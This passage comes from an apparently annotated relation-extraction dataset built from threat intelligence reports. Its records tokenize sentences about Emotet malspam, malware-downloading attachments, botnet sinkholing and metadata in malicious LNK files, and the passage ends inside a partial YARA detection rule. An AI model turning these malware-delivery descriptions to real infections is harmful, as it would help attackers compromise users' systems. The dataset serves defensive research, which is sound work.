"pos": [19, 20], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "content", "pos": [24, 25], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [229, 229], "name": "system", "pos": [33, 34], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [235, 235], "name": "malware", "pos": [39, 40], "index": "27_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "ST", "evidence": [0, 1, 2], "t": 1, "h": 7}, {"r": "RF", "evidence": [0, 1, 2], "t": 1, "h": 7}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "EX", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "IJ", "evidence": [2, 3, 4], "h": 7, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 12, "t": 13}, {"r": "RF", "evidence": [4], "h": 12, "t": 14}, {"r": "ST", "evidence": [4], "h": 12, "t": 15}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [6], "t": 18, "h": 19}, {"r": "EX", "evidence": [6], "t": 20, "h": 21}, {"r": "CO", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [7], "t": 22, "h": 23}, {"r": "FR", "evidence": [7], "h": 23, "t": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "EX", "evidence": [7], "h": 24, "t": 25}, {"r": "ST", "evidence": [7], "h": 24, "t": 26}, {"r": "RF", "evidence": [7], "h": 24, "t": 26}, {"r": "RD", "evidence": [7], "t": 25, "h": 27}]}, {"title": "080-2", "sents": [["Whenever", "the", "name", "servers", "associated", "with", "these", "TLDs", "receive", "resolution", "requests", "from", "clients", "on", "the", "internet", "for", "domains", "that", "are", "not", "actively", "configured", "to", "resolve", "to", "a", "specific", "IP", "address", ",", "they", "respond", "with", "a", "default", "IP", "address", "value", ",", "regardless", "of", "whether", "the", "domain", "being", "queried", "is", "invalid", "or", "has", "ever", "existed", "."], ["While", "the", "adversary", "no", "longer", "controls", "the", "domain", ",", "orphaned", "bots", "are", "still", "continuing", "to", "reach", "out", "to", "it", ",", "attempting", "to", "establish", "a", "C2", "channel", "."], ["Note", "that", "it", "currently", "resolves", "to", "the", "default", "IP", "address", "returned", "for", "nonexistent", "domains", "in", "the", "WS", "TLD", "as", "previously", "described", "earlier", "in", "this", "section", "."], ["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."], ["Opening", "the", "attached", "files", "and", "enabling", "the", "malicious", "contents", "causes", "them", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "infrastructure", "to", "download", "additional", "malicious", "content", "that", "is", "then", "executed", "on", "the", "victim", "'s", "system", ",", "thus", "infecting", "it", "with", "malware", "."], ["The", "overwhelming", "majority", "of", "attachments", "leverage", "malicious", "Microsoft", "Office", "documents", "(", "i.", "e", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [3, 3], "name": "servers", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "TLDs", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "clients", "pos": [12, 13], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [36, 36], "name": "IP address", "pos": [36, 38], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [56, 56], "name": "adversary", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [78, 78], "name": "C2 channel", "pos": [24, 26], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "it", "pos": [2, 3], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [89, 89], "name": "IP address", "pos": [8, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [98, 98], "name": "TLD", "pos": [17, 18], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [107, 107], "name": "Sinkholing", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [115, 115], "name": "botnet traffic", "pos": [8, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [121, 121], "name": "source", "pos": [14, 15], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [126, 126], "name": "destination", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "It", "pos": [0, 1], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "spam", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "emails", "pos": [3, 4], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [165, 165], "name": "Emotet", "pos": [6, 7], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "attachments", "pos": [12, 13], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [176, 176], "name": "downloaders", "pos": [17, 18], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "files", "pos": [3, 4], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [186, 186], "name": "contents", "pos": [8, 9], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [197, 197], "name": "infrastructure", "pos": [19, 20], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "content", "pos": [24, 25], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [211, 211], "name": "system", "pos": [33, 34], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [217, 217], "name": "malware", "pos": [39, 40], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [223, 223], "name": "attachments", "pos": [4, 5], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [228, 228], "name": "documents", "pos": [9, 10], "index": "26_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "RF", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "EX", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "IJ", "evidence": [1, 2, 3], "h": 4, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RF", "evidence": [3], "h": 9, "t": 11}, {"r": "ST", "evidence": [3], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [5], "t": 15, "h": 16}, {"r": "EX", "evidence": [5], "t": 17, "h": 18}, {"r": "CO", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "t": 19, "h": 20}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "ST", "evidence": [6], "h": 21, "t": 23}, {"r": "RF", "evidence": [6], "h": 21, "t": 23}, {"r": "RD", "evidence": [6], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "h": 25, "t": 26}]}, {"title": "080-3", "sents": [["While", "the", "adversary", "no", "longer", "controls", "the", "domain", ",", "orphaned", "bots", "are", "still", "continuing", "to", "reach", "out", "to", "it", ",", "attempting", "to", "establish", "a", "C2", "channel", "."], ["Note", "that", "it", "currently", "resolves", "to", "the", "default", "IP", "address", "returned", "for", "nonexistent", "domains", "in", "the", "WS", "TLD", "as", "previously", "described", "earlier", "in", "this", "section", "."], ["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."], ["Opening", "the", "attached", "files", "and", "enabling", "the", "malicious", "contents", "causes", "them", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "infrastructure", "to", "download", "additional", "malicious", "content", "that", "is", "then", "executed", "on", "the", "victim", "'s", "system", ",", "thus", "infecting", "it", "with", "malware", "."], ["The", "overwhelming", "majority", "of", "attachments", "leverage", "malicious", "Microsoft", "Office", "documents", "(", "i.", "e", "."], ["DOC", ",", "DOCX", ",", "XLS", ",", "XLSX", ")", "however", "Emotet", "malspam", "has", "also", "been", "observed", "featuring", "ZIP", "archives", ",", "PDFs", ",", "and", "more", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "adversary", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [24, 24], "name": "C2 channel", "pos": [24, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "it", "pos": [2, 3], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [35, 35], "name": "IP address", "pos": [8, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "TLD", "pos": [17, 18], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [53, 53], "name": "Sinkholing", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "botnet traffic", "pos": [8, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [67, 67], "name": "source", "pos": [14, 15], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [72, 72], "name": "destination", "pos": [19, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [74, 74], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "spam", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "emails", "pos": [3, 4], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "Emotet", "pos": [6, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "attachments", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "downloaders", "pos": [17, 18], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [127, 127], "name": "files", "pos": [3, 4], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "contents", "pos": [8, 9], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "infrastructure", "pos": [19, 20], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "content", "pos": [24, 25], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [157, 157], "name": "system", "pos": [33, 34], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "malware", "pos": [39, 40], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "attachments", "pos": [4, 5], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "documents", "pos": [9, 10], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "malspam", "pos": [10, 11], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "ZIP archives", "pos": [16, 18], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [198, 198], "name": "PDFs", "pos": [19, 20], "index": "25_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "IJ", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "RF", "evidence": [2], "h": 5, "t": 7}, {"r": "ST", "evidence": [2], "h": 5, "t": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "t": 11, "h": 12}, {"r": "EX", "evidence": [4], "t": 13, "h": 14}, {"r": "CO", "evidence": [4], "h": 11, "t": 13}, {"r": "RD", "evidence": [5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "ST", "evidence": [5], "h": 17, "t": 19}, {"r": "RF", "evidence": [5], "h": 17, "t": 19}, {"r": "RD", "evidence": [5], "t": 18, "h": 20}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [7], "h": 24, "t": 25}, {"r": "CO", "evidence": [7], "t": 23, "h": 24}]}, {"title": "080-4", "sents": [["Note", "that", "it", "currently", "resolves", "to", "the", "default", "IP", "address", "returned", "for", "nonexistent", "domains", "in", "the", "WS", "TLD", "as", "previously", "described", "earlier", "in", "this", "section", "."], ["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."], ["Opening", "the", "attached", "files", "and", "enabling", "the", "malicious", "contents", "causes", "them", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "infrastructure", "to", "download", "additional", "malicious", "content", "that", "is", "then", "executed", "on", "the", "victim", "'s", "system", ",", "thus", "infecting", "it", "with", "malware", "."], ["The", "overwhelming", "majority", "of", "attachments", "leverage", "malicious", "Microsoft", "Office", "documents", "(", "i.", "e", "."], ["DOC", ",", "DOCX", ",", "XLS", ",", "XLSX", ")", "however", "Emotet", "malspam", "has", "also", "been", "observed", "featuring", "ZIP", "archives", ",", "PDFs", ",", "and", "more", "."], ["Emotet", "has", "also", "been", "observed", "distributing", "emails", "containing", "hyperlinks", "that", ",", "when", "clicked", "by", "potential", "victims", ",", "directs", "their", "system", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "servers", "to", "obtain", "malicious", "content", "to", "execute", ",", "resulting", "in", "malware", "infection", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "IP address", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "TLD", "pos": [17, 18], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [26, 26], "name": "Sinkholing", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "botnet traffic", "pos": [8, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "source", "pos": [14, 15], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "destination", "pos": [19, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "spam", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "emails", "pos": [3, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "Emotet", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "attachments", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "downloaders", "pos": [17, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "files", "pos": [3, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "contents", "pos": [8, 9], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "infrastructure", "pos": [19, 20], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "content", "pos": [24, 25], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [130, 130], "name": "system", "pos": [33, 34], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [136, 136], "name": "malware", "pos": [39, 40], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [142, 142], "name": "attachments", "pos": [4, 5], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "documents", "pos": [9, 10], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "malspam", "pos": [10, 11], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "ZIP archives", "pos": [16, 18], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [171, 171], "name": "PDFs", "pos": [19, 20], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "Emotet", "pos": [0, 1], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [182, 182], "name": "emails", "pos": [6, 7], "index": "25_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [184, 184], "name": "hyperlinks", "pos": [8, 9], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [204, 204], "name": "servers", "pos": [28, 29], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [208, 208], "name": "content", "pos": [32, 33], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [214, 214], "name": "malware infection", "pos": [38, 40], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "ST", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "t": 9, "h": 10}, {"r": "EX", "evidence": [3], "t": 11, "h": 12}, {"r": "CO", "evidence": [3], "h": 9, "t": 11}, {"r": "RD", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "EX", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "h": 15, "t": 17}, {"r": "RF", "evidence": [4], "h": 15, "t": 17}, {"r": "RD", "evidence": [4], "t": 16, "h": 18}, {"r": "WR", "evidence": [5], "h": 19, "t": 20}, {"r": "CO", "evidence": [6], "h": 22, "t": 23}, {"r": "CO", "evidence": [6], "t": 21, "h": 22}, {"r": "WR", "evidence": [7], "h": 24, "t": 26}, {"r": "ST", "evidence": [7], "h": 24, "t": 27}, {"r": "WR", "evidence": [7], "h": 24, "t": 28}, {"r": "FR", "evidence": [7], "h": 24, "t": 29}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}]}, {"title": "080-5", "sents": [["Sinkholing", "is", "the", "process", "of", "redirecting", "this", "malicious", "botnet", "traffic", "away", "from", "its", "intended", "source", "and", "into", "a", "harmless", "destination", "."], ["It", "spun", "up", "again", "in", "June", "with", "massive", "amounts", "of", "spam", "being", "sent", "starting", "in", "July", "and", "continuing", "through", "to", "the", "present", "time", ",", "with", "intermittent", "pauses", "along", "the", "way", "."], ["Most", "of", "the", "emails", "associated", "with", "Emotet", "feature", "the", "use", "of", "malicious", "attachments", "that", "function", "as", "malware", "downloaders", "."], ["Opening", "the", "attached", "files", "and", "enabling", "the", "malicious", "contents", "causes", "them", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "infrastructure", "to", "download", "additional", "malicious", "content", "that", "is", "then", "executed", "on", "the", "victim", "'s", "system", ",", "thus", "infecting", "it", "with", "malware", "."], ["The", "overwhelming", "majority", "of", "attachments", "leverage", "malicious", "Microsoft", "Office", "documents", "(", "i.", "e", "."], ["DOC", ",", "DOCX", ",", "XLS", ",", "XLSX", ")", "however", "Emotet", "malspam", "has", "also", "been", "observed", "featuring", "ZIP", "archives", ",", "PDFs", ",", "and", "more", "."], ["Emotet", "has", "also", "been", "observed", "distributing", "emails", "containing", "hyperlinks", "that", ",", "when", "clicked", "by", "potential", "victims", ",", "directs", "their", "system", "to", "reach", "out", "to", "the", "attacker", "'s", "distribution", "servers", "to", "obtain", "malicious", "content", "to", "execute", ",", "resulting", "in", "malware", "infection", "."], ["In", "many", "cases", ",", "Emotet", "is", "the", "initial", "stage", "of", "a", "multi-stage", "infection", "process", "that", "often", "features", "use", "of", "additional", "malware", "payloads", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [0, 0], "name": "Sinkholing", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "botnet traffic", "pos": [8, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "source", "pos": [14, 15], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [19, 19], "name": "destination", "pos": [19, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "spam", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "emails", "pos": [3, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "Emotet", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "attachments", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [69, 69], "name": "downloaders", "pos": [17, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "files", "pos": [3, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "contents", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "infrastructure", "pos": [19, 20], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "content", "pos": [24, 25], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [104, 104], "name": "system", "pos": [33, 34], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "malware", "pos": [39, 40], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "attachments", "pos": [4, 5], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "documents", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "malspam", "pos": [10, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "ZIP archives", "pos": [16, 18], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "PDFs", "pos": [19, 20], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "Emotet", "pos": [0, 1], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "emails", "pos": [6, 7], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [158, 158], "name": "hyperlinks", "pos": [8, 9], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [178, 178], "name": "servers", "pos": [28, 29], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "content", "pos": [32, 33], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [188, 188], "name": "malware infection", "pos": [38, 40], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [195, 195], "name": "Emotet", "pos": [4, 5], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "infection process", "pos": [12, 14], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [212, 212], "name": "payloads", "pos": [21, 22], "index": "29_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "t": 6, "h": 7}, {"r": "EX", "evidence": [2], "t": 8, "h": 9}, {"r": "CO", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "t": 10, "h": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "EX", "evidence": [3], "h": 12, "t": 13}, {"r": "ST", "evidence": [3], "h": 12, "t": 14}, {"r": "RF", "evidence": [3], "h": 12, "t": 14}, {"r": "RD", "evidence": [3], "t": 13, "h": 15}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "CO", "evidence": [5], "h": 19, "t": 20}, {"r": "CO", "evidence": [5], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 21, "t": 23}, {"r": "ST", "evidence": [6], "h": 21, "t": 24}, {"r": "WR", "evidence": [6], "h": 21, "t": 25}, {"r": "FR", "evidence": [6], "h": 21, "t": 26}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 27}, {"r": "FR", "evidence": [7], "t": 27, "h": 28}, {"r": "WR", "evidence": [7], "h": 28, "t": 29}]}, {"title": "058-0", "sents": [["An", "overview", "of", "LNK", "file", "formatMicrosoft", "describes", "the", "Shell", "Link", "binary", "file", "format", "-", "the", "format", "used", "by", "Windows", "files", "with", "the", "extension", "``", "LNK", "''", "-", "as", "a", "file", "which", "contains", "information", "that", "can", "be", "used", "by", "the", "Operating", "System", "or", "an", "application", "to", "access", "another", "data", "object", "on", "the", "system", "."], ["The", "LNK", "structure", "stores", "information", "about", "the", "target", "object", "as", "well", "as", "other", "related", "information", "about", "the", "application", "behavior", "and", "metadata", "from", "the", "machine", "where", "the", "LNK", "file", "was", "created", "."], ["Sometimes", ",", "when", "the", "target", "information", "is", "not", "present", "on", "the", "LNK", "file", ",", "we", "might", "need", "to", "look", "at", "the", "Metadata", "Store", "structure", "for", "additional", "data", "."], ["SharPersist", "PayloadFigure", "1", ":", "SharPersist", "payloadIn", "Figure", "1", "we", "can", "see", "the", "MAC", "timestamps", "are", "empty", ",", "but", "the", "LNK", "file", "still", "contains", "information", "about", "the", "relative", "path", "where", "the", "file", "was", "created", ",", "as", "well", "as", "the", "SID", "of", "the", "user", "who", "created", "the", "file", "."], ["Quantum", "Builder", "PayloadFigure", "2", ":", "Quantum", "builder", "payloadIn", "Figure", "2", ",", "we", "can", "see", "the", "Quantum", "Builder", "does", "not", "attempt", "to", "wipe", "out", "any", "metadata", "and", "the", "generated", "LNK", "file", "contains", "a", "trove", "of", "metadata", "about", "the", "system", "where", "it", "was", "created", "."], ["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", 